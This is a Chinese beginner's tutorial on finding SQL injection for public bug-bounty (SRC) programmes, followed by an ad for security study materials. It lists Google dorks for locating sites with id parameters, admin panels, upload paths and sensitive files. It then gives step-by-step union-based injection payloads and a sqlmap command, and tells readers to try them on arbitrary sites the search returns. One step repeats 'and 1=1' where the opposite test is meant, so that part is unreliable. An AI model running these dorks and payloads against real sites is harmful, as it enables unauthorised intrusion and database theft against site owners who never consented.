# 原创
：  超级干货！如何挖公益SRC实战/SQL注入

# 超级干货！如何挖公益SRC实战/SQL注入

**目录**

[一、信息收集](#%E4%B8%80%E3%80%81%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86)

[二、实战演示](#%E4%BA%8C%E3%80%81%E5%AE%9E%E6%88%98%E6%BC%94%E7%A4%BA)

[三、使用sqlmap进行验证](#%E4%B8%89%E3%80%81%E4%BD%BF%E7%94%A8sqlmap%E8%BF%9B%E8%A1%8C%E9%AA%8C%E8%AF%81)

[四、总结](#%E5%9B%9B%E3%80%81%E6%80%BB%E7%BB%93)

---


### 一、信息收集

1.查找带有ID传参的网站（可以查找sql注入漏洞）<br/> inurl:asp id=xx<br/> 2.查找网站后台（多数有登陆框，可以查找弱口令，暴力破解等漏洞）<br/> site:http://xxxx.com “admin”<br/> site:http://xx.com intext:管理<br/> site:http://xx.com inurl:login<br/> site:http://xx.com intitle:后台<br/> 3.查看上传漏洞<br/> site:http://xx.com inurl:file<br/> site:http://xx.com inurl:load<br/> 4.查找敏感文件<br/> ﬁletype:mdb|doc|xlsx|pdf

### 二、实战演示

1.谷歌语法搜索<br/>`inurl:php id=62`<br/>  

<br/> 随便点进一个带有id传参=62的网站，大概率存在SQL注入<br/>  

<br/> 2.判断是否存在SQL注入漏洞，显示页面正常<br/>`id=62 and 1=1`

<br/> 3.`id=62 and 1=1`显示页面不正常，已经肯定存在SQL注入<br/>  

<br/> 4.查找列数<br/>`id=62 order by 10`<br/> 发现列数是10<br/>  

<br/> 5.查看回显点<br/>`id=111111 union select 1,2,3,4,5,6,7,8,9,10 from information_schema.tables where table_schema=database() limit 0,1-- qwe`

6.输出表名<br/>`id=111111 union select 1,2,3,4,5,6,table_name,8,9,10 from information_schema.tables where table_schema=database() limit 0,1-- qwe`

### 三、使用sqlmap进行验证

使用sqlmap命令查看库名<br/>`sqlmap.py -u url --dbs`

### 四、总结

1.谷歌语法找到注入点<br/> 2.判断注入是否存在<br/> 3.查找列数<br/> 4.查找表名<br/> 5.使用sqlmap进行验证<br/> 第一次投稿，觉得这次实战记录很适合新手小白挖SRC，希望多多支持！

> 
申明：本公众号所分享内容仅用于网络安全技术讨论，切勿用于违法途径，
所有渗透都需获取授权，违者后果自行承担，与本号及作者无关，请谨记守法.


**没看够~？欢迎关注！**

## **免费领取安全学习资料包！**<img alt="" height="768" src="https://img-blog.csdnimg.cn/229ab6a7e1734220a4524fbf5b7b908b.png" width="1024"/>

渗透工具

技术文档、书籍

<img alt="" height="516" src="https://img-blog.csdnimg.cn/7130a4b1f52d4d8485a6c3908783e938.png" width="852"/> <img alt="" height="523" src="https://img-blog.csdnimg.cn/188b72ac4f8d48a1ade57b1acd19e678.png" width="856"/>

面试题

帮助你在面试中脱颖而出

视频

基础到进阶

环境搭建、HTML，PHP，MySQL基础学习，信息收集，SQL注入,XSS，CSRF，暴力破解等等

<img alt="" height="481" src="https://img-blog.csdnimg.cn/cd9e90e7e9b54df9be8052adbfac10ac.png" width="694"/> <img alt="" height="77" src="https://img-blog.csdnimg.cn/2ccdaaec207942969fbf46c36c7fa92b.png" width="665"/>

应急响应笔记
